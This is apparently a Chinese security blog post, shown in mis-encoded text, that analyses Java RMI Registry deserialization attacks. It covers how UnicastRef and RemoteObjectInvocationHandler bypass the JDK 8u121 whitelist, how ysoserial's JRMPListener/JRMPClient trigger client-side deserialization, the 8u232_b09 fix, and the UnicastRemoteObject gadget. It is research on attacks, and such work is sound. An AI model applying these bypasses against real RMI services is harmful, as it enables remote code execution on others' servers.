jdk&lt;8u232_b09jdk8u121‰øÆÂ§çÂêéÁöÑÁâàÊú¨ÈáåÔºåÂØπÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÂÅö‰∫ÜÁôΩÂêçÂçïÈôêÂà∂ÔºåËßÅsun/rmi/registry/RegistryImpl.java#registryFilter Ëøô‰∏™ÁôΩÂêçÂçïÂåÖÊã¨Ôºö 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; 0x02‰∏≠ÂèëÈÄÅÁöÑÂØπË±°ÊòØ‰ª£ÁêÜÂêéÁöÑAnnotationInvocationHandlerÂØπË±°ÔºåÂπ∂‰∏çÂú®‰∏äËø∞ÂÖÅËÆ∏ÁöÑÁ±ªÈáåÈù¢ÔºåËøôÂØºËá¥ÂéüÂÖàysoserialÂ∑•ÂÖ∑‰∏≠ÁöÑysoserial.exploit.RMIRegisterExploitÊó†Ê≥ïÂà©Áî®„ÄÇËøôÈáåÊàë‰ª¨ÂèÇËÄÉ3ÁöÑÊñπÊ≥ïÊù•ËææÊàêÂà©Áî®„ÄÇ È¶ñÂÖàÊÄùË∑ØÊØîËæÉÊòéÁ°ÆÁöÑÊòØÔºåÂ¶ÇÊûúË¶ÅÁªïËøáËøô‰∏™ÈôêÂà∂ÔºåÊàë‰ª¨ÈúÄË¶ÅÂú®‰∏äËø∞ÁöÑÁôΩÂêçÂçïÈáåÊâæÂà∞ÂèØ‰ª•Âà©Áî®ÁöÑÂØπË±°„ÄÇ Âú®ÁôΩÂêçÂçïÈáåÊàë‰ª¨Ê≥®ÊÑè‰∏Ä‰∏ã‰∏§‰∏™ÁâπÊÆäÂØπË±°RemoteÂØπË±°ÂíåUnicastRefÂØπË±° 1. UnicastRefÂØπË±°Êàë‰ª¨ÈÉΩÁü•ÈÅìRMIËøáÁ®ã‰∏≠Â≠òÂú®ÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Âô®Á´Ø‰πãÈó¥ÁöÑ‰∫§‰∫íÔºåÈÇ£‰πàÂú®‰ª£Á†ÅÂ±ÇÈù¢ÔºåÊàë‰ª¨ÈúÄË¶ÅÊÄé‰πàÂéªÂàõÈÄ†ËøôÊ†∑‰∏Ä‰∏™ÈìæÊé•Âë¢Ôºü Áî±‰∫éÊºèÊ¥ûÂèëÁîüÁÇπ‰∏∫ÂêëËøúÁ®ãÊúçÂä°Âô®Ê≥®ÂÜåÂØπË±°ÁöÑÂºïÁî®„ÄÇÂõûÈ°æ‰∏Ä‰∏ãÔºåÊàë‰ª¨Âú®bindÊó∂Ôºå‰ºöÂÖàÂéªËé∑Âæó‰∏Ä‰∏™RegistryÔºåÁ±ª‰ºº‰∏ãÈù¢ 1Registry registry = LocateRegistry.getRegistry(\"192.168.98.80\"); Ë∑üËøõjava/rmi/registry/LocateRegistry.java#getRegistry Ê≥®ÊÑèÂà∞ËøôÊ†∑‰∏ÄÊÆµ‰ª£Á†ÅÔºåÈÄöËøáTCPEndpointÊ≥®ÂÜåÊúçÂä°Á´ØÁöÑhost„ÄÅÁ´ØÂè£Á≠â‰ø°ÊÅØÔºå‰ª•UnicastRefÂ∞ÅË£ÖliveRef.Âú®‰∏ãÈù¢createProxyÊó∂‰ΩøÁî®‰∫ÜRemoteObjectInvocationHandler‰Ωú‰∏∫UnicastRefÂä®ÊÄÅ‰ª£ÁêÜÁöÑÂ§ÑÁêÜÁ±ª ÊúÄÁªàÔºåÊàë‰ª¨Â∞Ü‰ª•ÂÆ¢Êà∑Á´ØÁöÑË∫´‰ªΩÂéªÈìæÊé•ÔºåÊâÄ‰ª•ËøôÈáåÁöÑRegistry‰ºöÊòØsun/rmi/registry/RegistryImpl_Stub.java#bindÂêëËøúÁ®ãRMI RegistryÊ≥®ÂÜå„ÄÇ newCallÂèëËµ∑ËøûÊé•ÔºåÂπ∂Â∞ÜÈúÄË¶ÅÁªëÂÆöÁöÑÂØπË±°ÂèëÈÄÅËøáÂéª„ÄÇ Âà∞ËøôÈáåÂ∞±ÁªìÊùü‰∫ÜÂêëËøúÁ®ãRegistryÂèëËµ∑ÁªëÂÆöÁöÑÊìç‰Ωú„ÄÇËøô‰∏™ËøáÁ®ã‰∏≠Êàë‰ª¨Áî®Âà∞‰∫ÜUnicastRefÂØπË±°ÔºåÈÇ£‰πàËøôÈáåÊÉ≥Ë±°‰∏Ä‰∏ãÔºåÂ¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂UnicastRefÂØπË±°ÈáåLiveRefÁöÑhostÂíåportÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ËÉΩÂèëËµ∑‰ªªÊÑèÁöÑRMIËøûÊé•„ÄÇËøôÈáåÂ∞±ÊòØysoserial‰∏≠JRMPClientÁöÑÂéüÁêÜÔºåÊù•Áúã‰∏Ä‰∏ãËøô‰∏™payload ÊòØ‰∏çÊòØÂæàÁÜüÊÇâXDÔºå‰ΩøÁî®ÁöÑÊñπÊ≥ïÂ∞±ÊòØÂâçÈù¢ÁªëÂÆöËøáÁ®ã‰∏≠ÁöÑ‰ª£Á†Å„ÄÇËÄåÂú®ÁôΩÂêçÂçïÈáåUnicastRefÂØπË±°ÊòØÂÖÅËÆ∏Ë¢´ÂèçÂ∫èÂàóÂåñÁöÑ„ÄÇ 2. RemoteObjectInvocationHandlerÂØπË±°ÂâçÈù¢ÂàÜÊûêÂà∞UnicastRefÂèØË¢´Áî®‰∫éÂèëËµ∑RMIËøûÊé•Ôºå‰ΩÜÊòØ‰∏∫‰∫ÜÁ¨¶ÂêàÂèëÈÄÅÁöÑÊù°‰ª∂Ôºå‰ªçÁÑ∂ÈúÄË¶ÅÊª°Ë∂≥ÂÆûÁé∞RemoteÊé•Âè£ÁöÑÊù°‰ª∂„ÄÇËÄåUnicastRefÂπ∂Ê≤°ÊúâÂÆûÁé∞RemoteÊé•Âè£ÔºåËøôÂ∞±ÊÑèÂë≥ÁùÄÁõ¥Êé•‰º†UnicastRefÊòØ‰∏çË°åÁöÑÔºåÊàë‰ª¨ËøòÈúÄË¶ÅÂÜçÂ§öÂÅö‰∏ÄÊ≠•ÔºåËøôÈáåÊúâ‰∏§ÁßçÊñπÊ≥ïÔºö Ë∑üRMIRegisterExploit‰∏ÄÊ†∑Ôºå‰ΩøÁî®ProxyÂèçÂ∞ÑÊù•ÂÆûÁé∞ÔºåÂÖ∂handlerÁªßÊâø‰∫éRemoteÂπ∂Â§ÑÁêÜ‰∫ÜÊûÑÈÄ†Â•ΩÁöÑUnicastRefÔºåËøôÈáåÁî®Âà∞ÁöÑÂ∞±ÊòØRemoteObjectInvocationHandler ÊâæÂà∞‰∏Ä‰∏™ÂèØ‰ª•Â∞ÅË£ÖUnicastRefÁöÑÂØπË±°ÔºåÂπ∂‰∏îËØ•ÂØπË±°ËøòÂÆûÁé∞‰∫ÜRemoteÂØπË±° ËøôÈáåJRMPClient‰ΩøÁî®ÁöÑRemoteObjectInvocationHandlerÂ∞±ÊòØÁ¨¨‰∏ÄÁßçÊñπÊ≥ïÔºåÊàë‰ª¨Â∞ÜAnnotationInvocationHandlerÊõøÊç¢ÊàêRemoteObjectInvocationHandler„ÄÇÂú®ÂèçÂ∫èÂàóÂåñÊó∂‰ºöË∞ÉÁî®RemoteObjectInvocationHandlerÁöÑÁà∂Á±ªRemoteObjectÁöÑreadObjectÂáΩÊï∞ ËøôÈáåÁöÑrefÂ∞±ÊòØÊàë‰ª¨‰º†ËøõÂéªÁöÑUnicastRefÔºåË∞ÉÁî®ÂÖ∂readExternalÂáΩÊï∞ÔºåËøôÈáå‰ªãÁªç‰∏Ä‰∏ãreadExternal JavaÈªòËÆ§ÁöÑÂ∫èÂàóÂåñÊú∫Âà∂ÈùûÂ∏∏ÁÆÄÂçïÔºåËÄå‰∏îÂ∫èÂàóÂåñÂêéÁöÑÂØπË±°‰∏çÈúÄË¶ÅÂÜçÊ¨°Ë∞ÉÁî®ÊûÑÈÄ†Âô®ÈáçÊñ∞ÁîüÊàêÔºå‰ΩÜÊòØÂú®ÂÆûÈôÖ‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•‰ºöÂ∏åÊúõÂØπË±°ÁöÑÊüê‰∏ÄÈÉ®ÂàÜ‰∏çÈúÄË¶ÅË¢´Â∫èÂàóÂåñÔºåÊàñËÄÖËØ¥‰∏Ä‰∏™ÂØπË±°Ë¢´ËøòÂéü‰πãÂêéÔºåÂÖ∂ÂÜÖÈÉ®ÁöÑÊüê‰∫õÂ≠êÂØπË±°ÈúÄË¶ÅÈáçÊñ∞ÂàõÂª∫Ôºå‰ªéËÄå‰∏çÂøÖÂ∞ÜËØ•Â≠êÂØπË±°Â∫èÂàóÂåñ„ÄÇ Âú®Ëøô‰∫õÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨ÂèØ‰ª•ËÄÉËôëÂÆûÁé∞ExternalizableÊé•Âè£‰ªéËÄå‰ª£ÊõøSerializableÊé•Âè£Êù•ÂØπÂ∫èÂàóÂåñËøáÁ®ãËøõË°åÊéßÂà∂„ÄÇExternalizableÊé•Âè£extends SerializableÊé•Âè£ÔºåËÄå‰∏îÂú®ÂÖ∂Âü∫Á°Ä‰∏äÂ¢ûÂä†‰∫Ü‰∏§‰∏™ÊñπÊ≥ïÔºöwriteExternal()ÂíåreadExternal()„ÄÇËøô‰∏§‰∏™ÊñπÊ≥ï‰ºöÂú®Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñËøòÂéüÁöÑËøáÁ®ã‰∏≠Ë¢´Ëá™Âä®Ë∞ÉÁî®Ôºå‰ª•‰æøÊâßË°å‰∏Ä‰∫õÁâπÊÆäÁöÑÊìç‰Ωú„ÄÇ https://xz.aliyun.com/t/5392 ËøôÈáåÁöÑreadExternalÂ∞±ÊòØÈáçÊñ∞ÂàõÂª∫‰∏Ä‰∏™tcpËøûÊé• ÁªßÁª≠ÂæÄ‰∏ãË∑ü ÈáçÊñ∞ÁîüÊàê‰∏Ä‰∏™LiveRefÂØπË±°ÂêéÔºåÂ∞ÜÂ≠òÂÇ®Âà∞ÂΩìÂâçÁöÑConnectionInputStream‰∏ä„ÄÇÂêéÁª≠ËØ•stream‰ºöÁªßÁª≠Ë∞ÉÁî®registerRefsÂáΩÊï∞ ÊúÄÁªàÁî±DGCClientÂèëËµ∑ËøûÊé•Ôºå‰∏ãÂõæ‰∏≠ÁöÑloopupÂáΩÊï∞ Âà∞ËøôÈáåÂêéÈù¢Â∞±ÊòØJRMPListenerÂèçÂ∫èÂàóÂåñÁöÑ‰∏úË•ø‰∫ÜÔºåËøôÈáåÂú®ÊúÄÂêéËøõË°åÂàÜÊûê„ÄÇ 3. RMIConnectionImpl_StubÂØπË±°ÂâçÈù¢ÊèêÂà∞‰∫Ü‰∏§ÁßçÊÄùË∑ØÔºåËøòÊúâ‰∏ÄÁßçÂ∞±ÊòØÊâæÂà∞‰∏Ä‰∏™ÂÆûÁé∞‰∫ÜRemoteÊé•Âè£Âπ∂‰∏îÂ∞ÅË£Ö‰∫ÜrefÁöÑÂØπË±°ÔºåËøôÈáåRMIConnectionImpl_StubÂØπË±°Â∞±ÊòØ RemoteObjectInvocationHandlerÂêéÁª≠ÁöÑËß¶Âèë‰∏ªË¶Å‰æùÈù†RemoteObjectÂØπË±°ÁöÑreadObjectÂáΩÊï∞ÁöÑÈáçÊñ∞Â°´ÂÖÖÔºåËÄåRMIConnectionImpl_StubÂØπË±°‰πüÁªßÊâø‰∫ÜRemoteObjectÊâÄ‰ª•ÂêéÈù¢ÁöÑ‰∏Ä‰∫õË∞ÉÁî®ËøáÁ®ãË∑üÁ¨¨‰∫å‰∏™ÂØπË±°‰∏ÄÊ†∑Ôºå‰∏çÂÜçÂèôËø∞„ÄÇ ÂÖ∂ÂÆûÈ°∫ÁùÄÊÄùË∑ØÊâæËøòËÉΩÂèëÁé∞DGCImpl_Stub„ÄÅRMIServerImpl_Stub„ÄÅRegistryImpl_Stub„ÄÅReferenceWrapper_StubÈÉΩÂèØ‰ª• 20200616 Êõ¥Êñ∞‰∏Ä‰∏™Â∞ètrickÂâçÈù¢2ÁöÑÈÉ®ÂàÜÊèêÂà∞‰∫ÜÁî±‰∫éUnicastRefÁöÑÂèçÂ∫èÂàóÂåñÔºåËøòÂéüÁöÑÂÜÖÂÆπref‰ºöË¢´Ê≥®ÂÜåÂà∞ÂΩìÂâçÁöÑConnectionInputStreamÁöÑincomingRefTableÔºåÂπ∂‰∫éStreamRemoteCallÁöÑreleaseInputStreamÊó∂Ë∞ÉÁî®ÂèëËµ∑ÂèçÂêëjrmpÈìæÊé•„ÄÇ ËøôÈáåÁöÑÈáçÁÇπÂú®‰∫éUnicastRefÁöÑÂèçÂ∫èÂàóÂåñÔºåÊàë‰ª¨Âú®3ÁöÑÈÉ®ÂàÜÊâæÁöÑÈÇ£Âá†‰∏™Á±ªÈÉΩÊòØÂõ†‰∏∫Â∞ÅË£ÖUnicastRefÔºåÂú®ÂÆûÈôÖÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ã‰∏≠ÔºåËøôÂá†‰∏™Á±ªÁöÑÂ±ûÊÄßË¢´Ë∞ÉÁî®ÂèçÂ∫èÂàóÂåñËÄåËøòÂéüUnicastRef„ÄÇ Âú®Â∏∏ËßÅÁöÑreadObjectÂáΩÊï∞ÁöÑÂ§ÑÁêÜ‰∏≠ÔºåÂÖ∂ÂÆûÊúâ‰∏ÄÁÇπÂæàÈáçË¶ÅÔºå‰ªñÊòØ‰∏Ä‰∏™ÈÄíÂΩíÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ãÔºåÂ∞±ÁÆóÂΩìÂâçÁ±ª‰∏çÂ≠òÂú®Ôºå‰ΩÜÊòØËøòÊòØ‰ºöÂéªÈÄíÂΩíÂèçÂ∫èÂàóÂåñÂΩìÂâçÊï∞ÊçÆ‰∏≠ÁöÑÁ±ªÂ±ûÊÄß„ÄÇ ÊâÄ‰ª•Êàë‰ª¨‰πüÂèØ‰ª•‰∏çÁî®ÂâçÈù¢ÊâæÂà∞ÁöÑÂá†‰∏™Á±ªÔºåËá™Â∑±ÂÜô‰∏Ä‰∏™Â∞ÅË£ÖUnicastRef‰πüËÉΩÂêåÊ†∑ËææÂà∞ËøôÁßçÊïàÊûúÔºåÂÖ∑‰ΩìÁúãRMIConnectWrapped 0x04 ÂêéÁª≠ jdk&gt;=8u232_b09jdkÁâàÊú¨8u232_b09‰øÆÂ§ç‰∫ÜÂâçÈù¢‰ΩøÁî®ÂèçÂêëÂèëËµ∑JRMPËøûÊé•ÁöÑÂà©Áî®„ÄÇ‰øÆÂ§çÁÇπÂåÖÊã¨‰∏§‰∏™ ‰∏ÄÔºöRegistryImpl_Skelsun.rmi.registry.RegistryImpl_Skel#dispatcherÔºåËøôÈáåÊà™‰∫ÜlookupÂáΩÊï∞ÁöÑÂ§ÑÁêÜÔºåbind/rebindÂáΩÊï∞ÁöÑÂ§ÑÁêÜÊòØ‰∏ÄÊ†∑ÁöÑ ÂΩìÂèëÁîüÂèçÂ∫èÂàóÂåñÈîôËØØÊàñËÄÖÁ±ªÂûãËΩ¨Êç¢ÈîôËØØÊó∂Ôºå‰ºöË∞ÉÁî®call.discardPendingRefsÔºåÂ∞ÜÁé∞ÊúâÁöÑJRMPËøûÊé•Ê∏ÖÈô§Êéâ„ÄÇ‰πüÂ∞±ÊÑèÂë≥ÁùÄËøôÈáåÊàë‰ª¨Êó†Ê≥ïÁî®JRMPÂèçÂêëÈìæÊé•ÁöÑÊñπÂºèÊù•ËææÊàêÂà©Áî®‰∫Ü„ÄÇ ‰∫åÔºöDGCImpl_StubÂΩìRegistryÂ§ÑÁêÜJRMPÂèçËøûÁöÑÊó∂ÂÄôÔºå‰ºöË∞ÉÁî®DGCImpl_Stub#dirtyÔºåËÄåref.invoke‰ºöÊúÄÁªàË∞ÉÁî®sun.rmi.transport.StreamRemoteCall#executeCallÊù•Â§ÑÁêÜËøîÂõûÁöÑÂºÇÂ∏∏ÔºåËøôÈáå‰ºöÊúÄÁªàÂØºËá¥ÂèçÂ∫èÂàóÂåñ(ËØ¶ÁªÜËßÅ0x05Áï™Â§ñ) ËÄåÂú®232ÁâàÊú¨ÔºåÂ∞ÜÂéüÊú¨Âú®ÂêéÈù¢Ê≥®ÂÜåÁöÑleaseFilterÊèêÂà∞‰∫ÜÂâçÈù¢ ÁúãÁúãËØ•ËøáÊª§Âô®ÁöÑÈôêÂà∂sun/rmi/transport/DGCImpl_Stub.java#leaseFilter ÂØπ‰∫éËøîÂõûÁöÑÂ∫èÂàóÂåñÂØπË±°ÔºåÂè™ÂÖÅËÆ∏‰∏äÈù¢ÁöÑÂá†ÁßçÁ±ªÂûãÔºåËÄåÁé∞ÊúâÁöÑÂèçÂ∫èÂàóÂåñÂà©Áî®Èìæ‰∏≠HashSet„ÄÅHashTableÁ≠âÁ±ªÈÉΩÊòØÈÄö‰∏çËøáÁöÑ„ÄÇ ÊâÄ‰ª•Âú®RegistryÂèëËµ∑ÁöÑÂèçÂêëËøûÊé•ÊòØÊó†Ê≥ïÂà©Áî®ÊàêÂäüÁöÑ„ÄÇ ps:ËøôÈáåÁî®ÁöÑDGCImpl_StubÊòØÂÆ¢Êà∑Á´ØÂèëËµ∑Êó∂‰ΩøÁî®ÁöÑÔºåÁõ∏ÂØπÂ∫îÁöÑËøòÊúâserverÁ´ØÊé•Êî∂ClientÂèëËµ∑ÁöÑËøûÊé•ÁöÑÂ§ÑÁêÜDGCImpl_SkelÔºåskelËøôÈáå‰πüÂ≠òÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂÖ∑‰ΩìËßÅ0x08 0x05 Áï™Â§ñÔºöysoserial‰∏≠ÁöÑJRMPListener‰∏éJRMPClientÁúã‰∫Ü‰∏äÈù¢ÂèØËÉΩ‰Ω†‰ºöÁñëÊÉëÔºå‰∏∫‰ªÄ‰πàserverÁ´ØÂèëËµ∑‰∏Ä‰∏™RMIÁöÑËøûÊé•Â∞±‰ºöËß¶ÂèëjavaÂèçÂ∫èÂàóÂåñÔºü ÂâçÊñáÊàë‰ª¨Â∞ÜÁöÑÊòØRMI RegistryÂú®Êé•Êî∂ËøúÁ®ãÁªëÂÆöÂØπË±°Êó∂ÊâÄÂèëÁîüÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÈÇ£‰πàRMI ClientÂú®Êé•Êî∂ServerÁ´ØÁöÑÊï∞ÊçÆÊó∂ÊòØÂê¶‰πü‰ºöÂèëÁîüÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂë¢ÔºüÁ≠îÊ°àÊòØËÇØÂÆöÁöÑÔºåÊØïÁ´üRMI‰∫§‰∫íËøáÁ®ã‰∏≠ÁöÑÊï∞ÊçÆÈááÁî®ÁöÑÊòØÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆÔºå‰πüÂ∞±ÊÑèÂë≥ÁùÄÂ≠òÂú®ÁùÄ‰∏Ä‰∏™ÂèçÂ∫èÂàóÂåñÁöÑËøáÁ®ã„ÄÇ Áúã‰∏Ä‰∏ãJRMPListenerÁöÑ‰ª£Á†ÅÔºåÁÆÄÂçïÊù•ËØ¥ÔºåÂÖ∂ÂÆûÁé∞‰∫Ü‰∏éRMI ClientÁöÑ‰∫§‰∫íÊµÅÁ®ã„ÄÇËøôÈáåÊàë‰ª¨Áõ¥Êé•ÁúãÈáçÁÇπÁöÑ‰ª£Á†Å Âú®ÂÆåÊàêÂâçÈù¢ÁöÑ‰∏Ä‰∫õ‰∫§‰∫íÊ≠•È™§ÂêéÔºåListener‰ºöÂêëClientÂèëÈÄÅ‰∏Ä‰∏™ExceptionalReturnÁöÑÁä∂ÊÄÅÔºåÂπ∂Â∞ÜÂ∫èÂàóÂåñÁöÑpayloadÂ°´ÂÖÖÂà∞BadAttributeValueExpExceptionÁöÑvalÂ±ûÊÄß„ÄÇËøôÈáåÁî®ÁöÑBadAttributeValueExpExceptionÂπ∂‰∏çÊòØÊàë‰ª¨‰ª•ÂâçÂàÜÊûêÊó∂ÂÅöÁöÑtoStringËß¶ÂèëÁÇπÔºåËÄåÊòØ‰ªÖ‰Ωú‰∏∫payloadÁöÑ‰∏Ä‰∏™ËΩΩ‰ΩìÔºåÂú®ÂèçÂ∫èÂàóÂåñBadAttributeValueExpExceptionÁöÑvalÂ±ûÊÄßÊó∂ÂêåÊ†∑ÂèçÂ∫èÂàóÂåñ‰∫ÜÊàë‰ª¨ÁöÑpayload„ÄÇ ËÄå‰Ωç‰∫éClientÂú®Êé•Êî∂Âà∞ExceptionalReturnÊó∂ÁöÑÂ§ÑÁêÜÊñπÂºèËßÅsun/rmi/transport/StreamRemoteCall.java#executeCallÂâçÈù¢ÁöÑÂàÜÊûêÈÉΩÁúÅÁï•‰∫Ü Âú®ËøôÈáåÊàë‰ª¨ÁúãÂà∞‰∫ÜÁÜüÊÇâÁöÑreadObjectÂáΩÊï∞ÔºåÂÖ∂Áî®‰∫éÂ∞ÜÂâçÈù¢ÁöÑExceptionËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇ Âà∞ËøôÈáåÂ∞±ÂèØ‰ª•‰∏≤Ëµ∑Êù•‰∫ÜÔºåClientÂèëËµ∑RMIËøûÊé•ÔºåËøûÊé•Âà∞Êàë‰ª¨ÁöÑÊÅ∂ÊÑèListener‰∏äÈù¢„ÄÇËÄåÊàë‰ª¨ÁöÑListenerÂ∞ÜËøîÂõû‰∏Ä‰∏™ÊûÑÈÄ†Â•ΩÁöÑExceptionÔºåÊó®Âú®ClientÊé•Êî∂Âà∞ExceptionalReturnÁöÑ‰ø°Âè∑Êó∂ËøõË°åËøòÂéüÔºå‰ªéËÄåÈÄ†Êàê‰∫ÜRMI ClientÁ´Ø‰πüÂèóÂà∞ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊîªÂáª„ÄÇ 0x06 ÊÄªÁªìÂâçÊñá‰∏ªË¶ÅËÆ≤ËØâ‰∫ÜRMIÁöÑÁõ∏ÂÖ≥ÂèçÂ∫èÂàóÂåñÈóÆÈ¢òÔºåÂåÖÊã¨RMI RegistryÂíåRMI ClientÊé•Êî∂Âà∞ÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÊó∂‰∫ßÁîüÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ ÂÖ®ÊñáÊâÄ‰ΩøÁî®ÁöÑJDKÁâàÊú¨‰∏∫JDK8ÔºåÂú®ÂàÜÊûêËøáÁ®ã‰∏≠ÔºåÂèëÁé∞Âú®ÊúÄËøëÁöÑJDK8uÁâàÊú¨‰∏äÔºåÂ∑≤Êó†Ê≥ïÂØπRMI RegistryÂèëËµ∑ÊîªÂáªÔºå‰ΩÜÂÖ∂Âú®JDK8u232_b09‰πãÂâçÁöÑÁâàÊú¨ËøòÊòØÂèØ‰ª•ÁöÑ„ÄÇ Êú¨Êñá‰∏ªË¶ÅÊîªÂáªÁöÑÊòØRMI RegistryÔºåËÄåRMIÁöÑÊîªÂáªÈù¢‰∏çÂçïÂçïÊñá‰∏≠ÊèêÂà∞ÁöÑËøôÁßçÊñπÂºèÔºåËøòÂ≠òÂú® ÈíàÂØπcodebaseÁöÑÊîªÂáªËßÅhttps://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.mdÔºåÂä†ËΩΩÊàë‰ª¨ÊûÑÈÄ†Â•ΩÁöÑclass„ÄÇÂΩìÁÑ∂Áé∞Âú®ËøôÁßçÊÉÖÂÜµÊØîËæÉÂ∞ë‰∫Ü„ÄÇ ÈíàÂØπÁªëÂÆöÁöÑÂç±Èô©objÁöÑÊîªÂáªÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøálistÊâÄÊúâÁªëÂÆöÁöÑobjÔºåÊü•ÊâæÂç±Èô©ÁöÑÁªëÂÆöÂú∞ÂùÄËøõË°åÊîªÂáª„ÄÇËøôÈáåÁöÑÂç±Èô©ÊÄé‰πàÂÆö‰πâÂë¢ÔºüÁ¨¨‰∏ÄÊòØÁªëÂÆöÁöÑÂØπË±°Á°ÆÂÆûÂ≠òÂú®Êìç‰ΩúÁ≥ªÁªüÂëΩ‰ª§Á≠âÔºõÁ¨¨‰∫åÊòØËØ•ÂØπË±°ÁöÑÁ±ªÂáΩÊï∞ÂèÇÊï∞‰∏≠Â≠òÂú®ÂèçÂ∫èÂàóÂåñÁÇπÔºåÊØîÂ¶Çhello(HashTable xxx)ÔºåÂÖ∂‰∏≠ÁöÑHashTableÊòØCommonsCollections7ÁöÑËß¶ÂèëÁÇπÔºåÂú®‰º†ÈÄíËøáÁ®ã‰∏≠Ôºåxxx‰ºöË¢´Â∫èÂàóÂåñÔºåÂà∞‰∫ÜRMI ServerÊó∂‰ºöÂèçÂ∫èÂàóÂåñÔºå‰πüÂ∞±ÊâßË°å‰∫ÜÊàë‰ª¨ÁöÑpayload„ÄÇÊúÄÂêéÔºåËøôÈáåÊöÇÊó∂ËøòÊ≤°ÊâæÂà∞Ê°à‰æã‚Ä¶ 0x07 20200303Êõ¥Êñ∞ UnicastRemoteObject GadgetËøô‰∏™GadgetÁöÑÊù•Ê∫êÊòØhttps://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/ ÁªèËøáÊµãËØïÔºåËøô‰∏™GadgetÂèØ‰ª•ÂÅöÂà∞Ë∑üJRMPClient‰∏ÄÊ†∑ÁöÑÊïàÊûúÔºå‰ΩÜÊòØÊó†Ê≥ïË∑ü‰∏äÈù¢ÁöÑLevel2‰∏ÄÊ†∑ÁªïËøáÈôêÂà∂ÔºåÂéüÂõ†Áúã‰∏ãÈù¢ Êú¨Âú∞Âú®bindÊàñrebind‰∏Ä‰∏™RemoteÂØπË±°Êó∂Ôºå‰ºöÂú®sun/rmi/server/MarshalOutputStream.java#replaceObjectËøõË°åËΩ¨Âåñ ÂéüÊù•ÁöÑÂØπË±°‰ºöË¢´ËΩ¨ÂåñÊàê‰∏äÈù¢ÁöÑ‰∏Ä‰∏™ÁªìÊûÑÔºåËøôÈáåÁõ¥Êé•‰∏¢Êéâ‰∫ÜUnicastRemoteObjectÔºåËá™ÁÑ∂Âú®RegistryÁ´ØÊó†Ê≥ï‰ªéUnicastRemoteObjectÁöÑreadObjectÂáΩÊï∞ÂºÄÂßãÔºåËøôÊ†∑Ëøô‰∏™GadgetÂ∞±Êó†Ê≥ïÊàêÂäüÂà©Áî®‰∫Ü„ÄÇ Ë¶ÅÊÉ≥Âà©Áî®Ëøô‰∏™ÈìæÊù•ÁªïËøáÈôêÂà∂ÔºåÊàë‰ª¨ÂèØËÉΩÂæóËá™Â∑±ÂÜô‰∏Ä‰∏™bindÁöÑËøáÁ®ãÊâçÂèØ‰ª•ÔºåÊäägetTargetÁöÑËøáÁ®ãÂéªÊéâÁõ¥Êé•ÂèëËøáÂéª„ÄÇËøô‰∏™GadgetÂà©Áî®‰ª∑ÂÄºÊØîËæÉ‰ΩéXD psÔºöË≤å‰ººÂèØ‰ª•ÈÄöËøáÈáçÂÜôÁöÑÊñπÂºèÊù•Ëß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåËøôÈáåÊúâÁ©∫ÂÜçÂàÜÊûêXD 20200617 Êõ¥Êñ∞UnicastRemoteObject GadgetÂâçÈù¢Âú®ÂÅöÂàÜÊûêÊó∂ÔºåÂèëÁé∞Âú®‰ΩøÁî®Ëøô‰∏™Âà©Áî®ÈìæÁöÑÊó∂ÂÄôÔºåÂú®ÂèëËøáÂéª‰πãÂâçÂ∞±‰ºöË¢´ÊõøÊç¢UnicastRefÁöÑÈóÆÈ¢òÔºåÂØºËá¥Êàë‰ª¨ÂèëÂà∞RegistryÂêéÊó†Ê≥ïËøòÂéüÂá∫Ê≠£Á°ÆÁöÑjrmpÔºå‰ªäÂ§©Êù•ÁúãÁúã‰ªñÊòØÊÄé‰πàÊõøÊç¢ÁöÑ java.io.ObjectOutputStream#writeObject0#1143 12345678if (enableReplace) &#123; Object rep = replaceObject(obj); if (rep != obj &amp;&amp; rep != null) &#123; cl = rep.getClass(); desc = ObjectStreamClass.lookup(cl, true); &#125; obj = rep;&#125; ‰ªécall.getOutputStream()Ëé∑ÂèñÂà∞ÁöÑoutputstreamÂú®ÂÜôÂÖ•ÂÖ∑‰ΩìÁöÑobjectÊó∂ÔºåÂêéÁª≠‰ºöÊâßË°åÂà∞ÂâçÈù¢ÁöÑ‰ª£Á†Å‰∏äÔºåÂà§Êñ≠ÊòØÂê¶ÈúÄË¶ÅenableReplaceÔºàÈªòËÆ§ÊòØtrueÔºâÔºåÊâÄ‰ª•‰ºöÈªòËÆ§Ëµ∞Âà∞ÊàëÂú®3Êúà‰ªΩÊó∂ÂàÜÊûêÁöÑÂú∞ÊñπÔºåÊääÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑjrmpËøûÊé•ÁªôÊõøÊç¢Êéâ‰∫Ü„ÄÇ 